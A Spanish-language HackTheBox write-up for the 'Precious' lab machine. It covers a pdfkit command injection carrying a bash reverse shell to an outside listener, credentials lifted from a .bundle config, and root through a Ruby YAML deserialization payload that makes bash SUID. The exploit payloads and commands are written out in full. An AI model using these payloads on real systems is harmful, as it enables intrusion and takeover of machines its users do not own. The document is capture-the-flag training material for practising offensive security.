---
title: Precious WriteUp
author: H4ckerLite 
date: 2023-01-17 00:00:00 +0800
categories: [hackthebox, machine, writeup]
tags: [hackthebox, writeup,virtual hosting, command injection, pdfkit, easy]
pin: true
image:
  path: ../../assets/img/commons/precious-writeup/Precious.png 
  alt: Precious WriteUp
---

Les explicaré comó comprometer la máquina [Precious](https://app.hackthebox.com/machines/513) de HackTheBox. En esta máquina nos enfretaremos a una versión vulnerable de `pdfkit` con la cual ganaremos acceso por una reverse shell y para la escalada cargaremos un archivo para convertir la BASH en SUID.

## Identificando el OS

Para ello debemos enviar una traza ICMP(Internet Control Message Protocol), estas siglas sinifican `Protocolo de Mensajes de Control de Internet` y con la información que nos reporte podemos identificar el SO mediante el TTL(Time To live)
```bash
❯ ping -c1 10.10.11.189
PING 10.10.11.189 (10.10.11.189) 56(84) bytes of data.
64 bytes from 10.10.11.189: icmp_seq=1 ttl=63 time=146 ms

--- 10.10.11.189 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 146.342/146.342/146.342/0.000 ms
```

Vemos lo siguiente:
* TTL 
	* El TTL es 63, esto indica que es una máquina Linux, ya que dichas máquinas cuentan con un TTL igual a 64, pero.....porqué aparece como 63 e infiero que es Linux. bueno nuestra conexión no es directa, pasa por un nodo intermedario y eso hace que el TTL disminuya en una unidad.

## Primeros pasos
Si le aplicamos un curl con modo silent y para ver por las cabeceras y filtrando por `location` vemos un dominio


```bash
❯ curl s 10.10.11.189 -i | grep Location
Location: http://precious.htb/
```
Sabiendo que se aplica Virtual Hosting debemos agregar el dominio al `/etc/hosts`


```bash
echo 10.10.11.189   precious.htb   | tee -a /etc/hosts
```
## Escaneo NMAP

Siempre que queramos auditar una máquina debemos aplicar un escaneo `NMAP`, ya que nos permitirá saber que puertos estan abiertos para poder empezar la fase de explotación



```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.189
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-19 12:45 -04
Initiating SYN Stealth Scan at 12:45
Scanning 10.10.11.189 [65535 ports]
Discovered open port 80/tcp on 10.10.11.189
Discovered open port 22/tcp on 10.10.11.189
Completed SYN Stealth Scan at 12:46, 15.23s elapsed (65535 total ports)
Nmap scan report for 10.10.11.189
Host is up, received user-set (0.16s latency).
Scanned at 2023-02-19 12:45:56 -04 for 15s
Not shown: 65471 closed tcp ports (reset), 62 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 15.35 seconds
           Raw packets sent: 74834 (3.293MB) | Rcvd: 73784 (2.951MB)
```

* Vemos los puertos
	* 22 este puerto corre por defecto el servicio SSH
	* 80 este es el encargado del purto WEB, es decir el HTTP

## Enumeración

Vemos que en la web podemos convertir una Web a PDF, suena interesante, así que nos creamos un archivo `.html` con la siguiete estructura
![Página]({{ 'assets/img/commons/precious-writeup/web.png' | relative_url }}){: .center-image }
_Página Web_


```
❯ cat index.html
<h1> Hola Mundo </h1>
```
Creamos un servivor HTTP con python por el puerto 80 y en dicha web ponemos nustro servidor.
> Recuerda cambiar tu IP.

![PDF]({{ 'assets/img/commons/precious-writeup/http.png' | relative_url }}){: .center-image }
_WEB_

Al darle `Submit` nos genera el PDF, si miramos los metadatos vemos la versión de `PDFKIT`

```bash
❯ exiftool PDF.pdf
ExifTool Version Number         : 12.16
File Name                       : PDF.pdf
Directory                       : .
File Size                       : 10 KiB
File Modification Date/Time     : 2023:02:19 13:10:53-04:00
File Access Date/Time           : 2023:02:19 13:10:53-04:00
File Inode Change Date/Time     : 2023:02:19 13:11:14-04:00
File Permissions                : rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Creator                         : Generated by pdfkit v0.8.6
```
Al hacer una simple busqueda por google, nos encontramos con este [articulo](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795)

Al usar este payload, debemos cambiar el sleep por una reverse shell.



```bash
http://example.com/?name=#{'%20`sleep 5`'}
```
Nos quedaría de esta manera.
```bash
http://example.com/?name=#{'%20`bash -c "bash -i >& /dev/tcp/10.10.14.19/444 0>&1"`'}
```

Una vez enviada la petición nos llega la reverse shell


```bash
❯ nc -lvnp 444
listening on [any] 444 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.11.189] 47004
bash: cannot set terminal process group (676): Inappropriate ioctl for device
bash: no job control in this shell
ruby@precious:/var/www/pdfapp$ 
```

Aplicamos un tratamiento a la [TTY](https:://h4ckerlite.github.io/posts/tty)
## Migrando de Usuario

Somos el usuario `ruby`, si miramos en el directorio *home* por archivos ocultos nos encontramos con esto

```bash
ruby@precious:~$ ls -la
total 32
drwxr-xr-x 5 ruby ruby 4096 Feb 19 12:28 .
drwxr-xr-x 4 root root 4096 Oct 26 08:28 ..
lrwxrwxrwx 1 root root    9 Oct 26 07:53 .bash_history -> /dev/null
-rw-r--r-- 1 ruby ruby  220 Mar 27  2022 .bash_logout
-rw-r--r-- 1 ruby ruby 3526 Mar 27  2022 .bashrc
dr-xr-xr-x 2 root ruby 4096 Oct 26 08:28 .bundle
drwxr-xr-x 4 ruby ruby 4096 Feb 19 08:27 .cache
drwxr-xr-x 3 ruby ruby 4096 Feb 19 12:28 .local
-rw-r--r-- 1 ruby ruby  807 Mar 27  2022 .profile
```

Si leemos lo que exixte dentro de esa carpeta vemos las credenciales del usuario henry


```bash
ruby@precious:~$ cat .bundle/config 
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
```
Migramos de usuario


```bash
ruby@precious:~$ ssh henry@10.10.11.189
The authenticity of host '10.10.11.189 (10.10.11.189)' can't be established.
ECDSA key fingerprint is SHA256:kRywGtzD4AwSK3m1ALIMjgI7W2SqImzsG5qPcTSavFU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.189' (ECDSA) to the list of known hosts.
henry@10.10.11.189's password: Q3c1AqGHtoI0aXAYFH 
Linux precious 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Feb 19 10:46:31 2023 from 10.10.14.103
henry@precious:~$ 
```
Procedemos a leer la flag del usuario


```bash
henry@precious:~$ cat user.txt 
67****************************bc
henry@precious:~$ 
```
## Escalada de Privilegios
Viendo por permisos **SUDO** nos encontramos con este


```bash
henry@precious:~$ sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```
Si leemos ese archivo vemos que intenta cargar el archivo "dependencies.yml", si buscamos por internet nos encontramos con este [blog](https://staaldraad.github.io/post/2019-03-02-universal-rce-ruby-yaml-load/) y este repositorio de [GitHub](https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565), nos creamos un archi con este contenido.

```bash
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: id
         method_id: :resolve
```

Cambiamos el **id** por: 
> chmod +s /bin/bash

Con esto nuestra BASH sera **SUID**


```bash
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: chmod +s /bin/bash
         method_id: :resolve
```
Ejecutamos el comando


```bash
henry@precious:~$ sudo ruby /opt/update_dependencies.rb 
henry@precious:~$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /bin/bash
henry@precious:~$ 
```
Ahora podemos lanzarnos la bash como root y leemos la flag de root


```bash
henry@precious:~$ bash -p
bash-5.1# whoami && id
root
uid=1000(henry) gid=1000(henry) euid=0(root) egid=0(root) groups=0(root),1000(henry)
bash-5.1# 
bash-5.1# cat /root/root.txt 
85****************************f4
bash-5.1# 
```
Acabamos de comprometer la máquina, Buena suerte.

